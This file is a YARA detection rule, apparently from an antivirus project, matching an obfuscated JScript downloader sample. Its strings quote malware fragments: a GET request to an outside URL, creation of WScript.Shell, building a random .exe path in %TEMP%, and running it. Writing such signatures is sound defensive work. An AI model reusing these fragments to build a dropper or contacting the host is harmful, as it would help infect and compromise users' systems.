rule sig_20160330_a778bd0dcdc0fc0ec6ef0a0756d910c2 {
  meta:
    description = "datamaliciousorder - file 20160330_a778bd0dcdc0fc0ec6ef0a0756d910c2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "afc5e9c1f5ea59d622ac1d22dfa4e0318490e85a101781afef74bce04408d0e8"

  strings:
    $s1  = "_R0[_LC](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "function _W(_FL, _L){_E = _E * 1; return _FL - _L;};" fullword ascii
    $s3  = "var _EO = function _AW() {return WScript[_C](\"WScript\"+\".Shell\");}(), _F1 = 11;" fullword ascii
    $s4  = "if (_R0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _F() {return _EO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"P5SAlPbG5C4Znr7f.ex\" + \"e\";};" fullword ascii
    $s6  = "function _T(){return _MZ + \"\";};" fullword ascii
    $s7  = "function _B0(_OD){_EO[\"Run\"](_OD, _E, _E);};" fullword ascii
    $s8  = "function _B() {return ((_J0 == true) && (_J0 == _B1)) ? 1 : _E;};" fullword ascii
    $s9  = " while (_X){" fullword ascii
    $s10 = "function _IV(){return _C;};" fullword ascii
    $s11 = "function _KU()" fullword ascii
    $s12 = "function _GZ(_S) {var _HW = (1, 2, 3, 4, 5, _S); return _HW;};" fullword ascii
    $s13 = "return _W(_XM, _UT);" fullword ascii
    $s14 = "function _XL(){return 22;};" fullword ascii
    $s15 = "var _S0 = new this[\"Date\"]();" fullword ascii
    $s16 = "_J0 = true; " fullword ascii
    $s17 = "var _J0 = false;" fullword ascii
    $s18 = "_B1 = true; " fullword ascii
    $s19 = "var _B1 = false;" fullword ascii
    $s20 = "var _XV = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}